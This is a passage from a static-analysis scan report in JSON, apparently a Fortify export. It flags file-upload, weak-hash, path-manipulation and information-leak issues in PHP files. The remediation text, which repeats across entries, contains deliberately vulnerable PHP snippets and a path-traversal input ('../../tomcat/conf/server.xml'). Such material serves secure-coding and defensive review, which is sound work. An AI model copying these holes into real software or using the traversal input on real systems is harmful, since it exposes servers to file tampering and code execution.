          },
          "fullDescription" : {
            "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
          },
          "help" : {
            "text" : "Regardless of the language in which a program is written, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a directory that is accessible from the Web and cause these files to be passed to the PHP interpreter, then they can cause malicious code contained in these files to execute on the server.\n\nExample 1: The following code processes uploaded files and moves them into a directory under the Web root. Attackers may upload malicious PHP source files to this program and subsequently request them from the server, which will cause them to be executed by the PHP interpreter.\n\n\n&lt;?php\n$udir = 'upload/'; // Relative path under Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nEven if a program stores uploaded files under a directory that isn't accessible from the Web, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or remote include vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.\n\nUnless your program specifically requires its users to upload files, disable the file_uploads option by including the following entry in php.ini:\n\n\nfile_uploads = 'off'\n\n\nThe file_uploads option can also be disabled by including the following entries in the Apache httpd.conf file:\n\n\nphp_flag  file_uploads  off\n\n\nIf a program must accept file uploads, then restrict the ability of an attacker to supply malicious content by only accepting the specific types of content the program expects. Most attacks that rely on uploaded content require that attackers be able to supply content of their choosing. Placing restrictions on this content can greatly limit the range of possible attacks.\n\nExample 2: The following code demonstrates a heavily restricted file upload mechanism that stores uploads in a directory that is inaccessible from the Web.\n\n`\n&lt;?php\n$udir = '/var/spool/uploads/'; # Outside of Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nAlthough this mechanism prevents attackers from requesting uploaded files directly, it does nothing to mitigate attacks against other vulnerabilities in the program that allow the attacker to leverage uploaded content. The best way to prevent such attacks is to make it difficult for the attacker to decipher the name and location of uploaded files. Such solutions are often program-specific and vary from storing uploaded files in a directory with a name generated from a strong random value when the program is initialized, to assigning each uploaded file a random name and tracking them with entries in a database [3].\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4639/?engineType=SCA&issue=B3DD23E68E7EF0BC0BE3FF87C6D610EA"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4630",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4630/?engineType=SCA&issue=AC42756FD138BF3FC69DFEDBB0598643"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4629",
          "shortDescription" : {
            "text" : "Weak Cryptographic Hash"
          },
          "fullDescription" : {
            "text" : "Weak cryptographic hashes cannot guarantee data integrity and should not be used in security-critical contexts.\n\n\n"
          },
          "help" : {
            "text" : "MD2, MD4, MD5, RIPEMD-160, and SHA-1 are popular cryptographic hash algorithms often used to verify the integrity of messages and other data. However, as recent cryptanalysis research has revealed fundamental weaknesses in these algorithms, they should no longer be used within security-critical contexts.\n\nEffective techniques for breaking MD and RIPEMD hashes are widely available, so those algorithms should not be relied upon for security. In the case of SHA-1, current techniques still require a significant amount of computational power and are more difficult to implement. However, attackers have found the Achilles' heel for the algorithm, and techniques for breaking it will likely lead to the discovery of even faster attacks.\n\nDiscontinue the use of MD2, MD4, MD5, RIPEMD-160, and SHA-1 for data-verification in security-critical contexts. Currently, SHA-224, SHA-256, SHA-384, SHA-512, and SHA-3 are good alternatives. However, these variants of the Secure Hash Algorithm have not been scrutinized as closely as SHA-1, so be mindful of future research that might impact the security of these algorithms.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4629/?engineType=SCA&issue=AC42756FD138BF3FC69DFEDBB0598642"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4372",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to rename() at impossible.php line 40, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4372/?engineType=SCA&issue=0731B425E8C0D3DC0A2263653226A9AC"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4652",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to rename() at impossible.php line 40, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4652/?engineType=SCA&issue=BDDC541747785C8EA40709797A54AF86"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4369",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to unlink() at impossible.php line 51, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4369/?engineType=SCA&issue=048F228A2A33AB037DB11957FC3F418C"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4432",
          "shortDescription" : {
            "text" : "Often Misused: File Upload"
          },
          "fullDescription" : {
            "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
          },
          "help" : {
            "text" : "Regardless of the language in which a program is written, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a directory that is accessible from the Web and cause these files to be passed to the PHP interpreter, then they can cause malicious code contained in these files to execute on the server.\n\nExample 1: The following code processes uploaded files and moves them into a directory under the Web root. Attackers may upload malicious PHP source files to this program and subsequently request them from the server, which will cause them to be executed by the PHP interpreter.\n\n\n&lt;?php\n$udir = 'upload/'; // Relative path under Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nEven if a program stores uploaded files under a directory that isn't accessible from the Web, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or remote include vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.\n\nUnless your program specifically requires its users to upload files, disable the file_uploads option by including the following entry in php.ini:\n\n\nfile_uploads = 'off'\n\n\nThe file_uploads option can also be disabled by including the following entries in the Apache httpd.conf file:\n\n\nphp_flag  file_uploads  off\n\n\nIf a program must accept file uploads, then restrict the ability of an attacker to supply malicious content by only accepting the specific types of content the program expects. Most attacks that rely on uploaded content require that attackers be able to supply content of their choosing. Placing restrictions on this content can greatly limit the range of possible attacks.\n\nExample 2: The following code demonstrates a heavily restricted file upload mechanism that stores uploads in a directory that is inaccessible from the Web.\n\n`\n&lt;?php\n$udir = '/var/spool/uploads/'; # Outside of Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nAlthough this mechanism prevents attackers from requesting uploaded files directly, it does nothing to mitigate attacks against other vulnerabilities in the program that allow the attacker to leverage uploaded content. The best way to prevent such attacks is to make it difficult for the attacker to decipher the name and location of uploaded files. Such solutions are often program-specific and vary from storing uploaded files in a directory with a name generated from a strong random value when the program is initialized, to assigning each uploaded file a random name and tracking them with entries in a database [3].\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4432/?engineType=SCA&issue=2D516C706B5D3F7213ADC9DB002BB110"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4382",
          "shortDescription" : {
            "text" : "Often Misused: File Upload"
          },
          "fullDescription" : {
            "text" : " Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server.\n\n\n"
          },
          "help" : {
            "text" : "Regardless of the language in which a program is written, the most devastating attacks often involve remote code execution, whereby an attacker succeeds in executing malicious code in the program's context. If attackers are allowed to upload files to a directory that is accessible from the Web and cause these files to be passed to the PHP interpreter, then they can cause malicious code contained in these files to execute on the server.\n\nExample 1: The following code processes uploaded files and moves them into a directory under the Web root. Attackers may upload malicious PHP source files to this program and subsequently request them from the server, which will cause them to be executed by the PHP interpreter.\n\n\n&lt;?php\n$udir = 'upload/'; // Relative path under Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nEven if a program stores uploaded files under a directory that isn't accessible from the Web, attackers might still be able to leverage the ability to introduce malicious content into the server environment to mount other attacks. If the program is susceptible to path manipulation, command injection, or remote include vulnerabilities, then an attacker might upload a file with malicious content and cause the program to read or execute it by exploiting another vulnerability.\n\nUnless your program specifically requires its users to upload files, disable the file_uploads option by including the following entry in php.ini:\n\n\nfile_uploads = 'off'\n\n\nThe file_uploads option can also be disabled by including the following entries in the Apache httpd.conf file:\n\n\nphp_flag  file_uploads  off\n\n\nIf a program must accept file uploads, then restrict the ability of an attacker to supply malicious content by only accepting the specific types of content the program expects. Most attacks that rely on uploaded content require that attackers be able to supply content of their choosing. Placing restrictions on this content can greatly limit the range of possible attacks.\n\nExample 2: The following code demonstrates a heavily restricted file upload mechanism that stores uploads in a directory that is inaccessible from the Web.\n\n`\n&lt;?php\n$udir = '/var/spool/uploads/'; # Outside of Web root\n$ufile = $udir . basename($_FILES['userfile']['name']);\nif (move_uploaded_file($_FILES['userfile']['tmp_name'], $ufile)) {\n    echo \"Valid upload received\n\";\n} else {\n    echo \"Invalid upload rejected\n\";\n} ?&gt;\n\n\nAlthough this mechanism prevents attackers from requesting uploaded files directly, it does nothing to mitigate attacks against other vulnerabilities in the program that allow the attacker to leverage uploaded content. The best way to prevent such attacks is to make it difficult for the attacker to decipher the name and location of uploaded files. Such solutions are often program-specific and vary from storing uploaded files in a directory with a name generated from a strong random value when the program is initialized, to assigning each uploaded file a random name and tracking them with entries in a database [3].\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4382/?engineType=SCA&issue=0CF64F962465CA5B66C7BCFC9FBA6CB5"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4503",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 20, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4503/?engineType=SCA&issue=5BB70EA8787D13F2DFC5D032E6FF61C3"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4492",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4492/?engineType=SCA&issue=5831F5CE959A695B3B3AF41986A35C75"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4622",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_help.php line 22, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4622/?engineType=SCA&issue=A2147A1BF6F92068625904D99D511436"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4471",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 54, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4471/?engineType=SCA&issue=4504F0E50B1163726D5BBE51EC241D86"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4481",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 54, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4481/?engineType=SCA&issue=521A8A7C37654535622DA057BE82AADC"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4428",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 59, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4428/?engineType=SCA&issue=297088179E41B83F29C1216067B26FFC"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4429",
          "shortDescription" : {
            "text" : "Path Manipulation"
          },
          "fullDescription" : {
            "text" : "Attackers can control the file system path argument to file_get_contents() at view_source.php line 59, which allows them to access or modify otherwise protected files.\n\n\n"
          },
          "help" : {
            "text" : "Path manipulation errors occur when the following two conditions are met:\n\n1. An attacker can specify a path used in an operation on the file system.\n\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\n\nFor example, the program might give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\n\n\nExample 1: The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"../../tomcat/conf/server.xml\", which causes the application to delete one of its own configuration files.\n\n\n$rName = $_GET['reportName'];\n$rFile = fopen(\"/usr/local/apfr/reports/\" . rName,\"a+\");\n...\nunlink($rFile);\n\n\nExample 2: The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension .txt.\n\n\n...\n$filename = $CONFIG_TXT['sub'] . \".txt\";\n$handle = fopen($filename,\"r\");\n$amt = fread($handle, filesize($filename));\necho $amt;\n...\n\n\nThe best way to prevent path manipulation is with a level of indirection: create a list of legitimate values from which the user must select. With this approach, the user-provided input is never used directly to specify the resource name.\n\nIn some situations this approach is impractical because the set of legitimate resource names is too large or too hard to maintain. Programmers often resort to implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. However, any such list of unsafe characters is likely to be incomplete and will almost certainly become out of date. A better approach is to create a list of characters that are permitted to appear in the resource name and accept input composed exclusively of characters in the approved set.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4429/?engineType=SCA&issue=298A9358C86F3446D90E543FC3B0191E"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4404",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in view_source.php with a call to highlight_string() on line 65. The information revealed by highlight_string() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
